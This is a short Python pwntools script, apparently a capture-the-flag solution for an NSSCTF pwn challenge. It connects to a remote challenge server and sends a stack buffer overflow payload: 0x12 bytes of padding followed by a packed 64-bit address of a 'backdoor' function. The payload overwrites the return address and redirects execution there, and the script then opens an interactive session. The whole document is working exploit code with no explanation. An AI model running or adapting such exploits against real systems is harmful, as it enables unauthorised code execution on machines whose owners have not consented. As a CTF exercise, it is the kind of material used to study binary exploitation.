from pwn import *

io = remote("node5.anna.nssctf.cn", 21918)


ret = 0x400546
backdoor = 0x400687

io.sendline(b"a" * (0xa + 0x8) + p64(backdoor))


io.interactive()
